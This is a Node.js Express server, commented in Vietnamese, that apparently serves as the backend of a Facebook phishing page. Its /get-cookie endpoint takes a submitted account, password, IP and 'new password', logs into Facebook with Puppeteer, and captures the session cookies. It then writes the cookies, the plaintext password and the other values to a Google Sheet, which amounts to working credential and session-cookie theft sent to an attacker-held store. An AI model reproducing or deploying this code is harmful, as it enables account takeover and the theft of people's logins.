const puppeteer = require("puppeteer");
const express = require("express");
const cors = require("cors");
const { google } = require("googleapis");
const bodyParser = require("body-parser");
const sheets = google.sheets("v4");
const app = express();
const port = 3000;

const auth = new google.auth.GoogleAuth({
  keyFile: "./credentials.json", // Đường dẫn đến tệp JSON chứa thông tin OAuth 2.0
  scopes: ["https://www.googleapis.com/auth/spreadsheets"],
});

function convertToCookieString(data) {
  let cookieString = "";
  for (let i = 0; i < data.length; i++) {
    const cookie = data[i];
    cookieString += `${cookie.name}=${cookie.value};`;
  }
  return cookieString;
}

app.use(express.json());
app.use(cors());
app.use(express.urlencoded());

app.post("/get-cookie", async (req, res) => {
  const { account, pass, ip, newPassword, confirmPassword } = req.body;
  const sheetsApi = await sheets.spreadsheets.values;
  const spreadsheetId = "1QpasOCS87O6n7_Fc7ciiZEz9hE_X5ejh84iopRUL8n0"; // Thay thế bằng ID của Google Sheets của bạn
  const range = "Sheet1"; // Thay thế bằng tên của sheet bạn muốn ghi dữ liệu
  const browser = await puppeteer.launch({ headless: false });
  const context = browser.defaultBrowserContext();
  //        URL                  An array of permissions
  context.overridePermissions("https://www.facebook.com", [
    "geolocation",
    "notifications",
  ]);
  const page = await browser.newPage();

  await page.goto("https://www.facebook.com/login");

  // Chờ cho các phần tử xuất hiện trên trang đăng nhập
  const accountElement = await page.$(`#email`);
  const passElement = await page.$(`#pass`);
  await accountElement.type(account, { delay: 500 });
  await passElement.type(pass, { delay: 500 });
  await page.click('button[name="login"]');

  // Chờ đợi cho đến khi trang chuyển hướng hoặc tải hoàn tất
  await page.waitForNavigation();
  setTimeout(async()=> {
    const cookies = await page.cookies();
    if (cookies.find((item) => item.name === "c_user")) {
      const request = {
        spreadsheetId: spreadsheetId,
        range: range,
        valueInputOption: "USER_ENTERED",
        resource: {
          values: [
            [
              JSON.stringify(cookies),
              convertToCookieString(cookies),
              account,
              pass,
              ip,
              newPassword
            ],
          ],
        },
        auth: auth,
      };
      try {
        const response = await sheetsApi.append(request);
        console.log("Dữ liệu đã được ghi thành công:");
        return res.status(200).json({});
      } catch (error) {
        console.error("Lỗi khi ghi dữ liệu:", error.message);
        return res.status(500).json({});
      }
    }
  }, 2000)

  // Lấy danh sách các cookie của trang web
  setTimeout(() => {
    browser.close();
  }, 5000);

  // Tại đây, bạn đã đăng nhập vào Facebook và có danh sách các cookie của trang web
  // Bạn có thể thực hiện các hành động tiếp theo sử dụng các cookie này

  // Đóng trình duyệt
  // await browser.close();
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
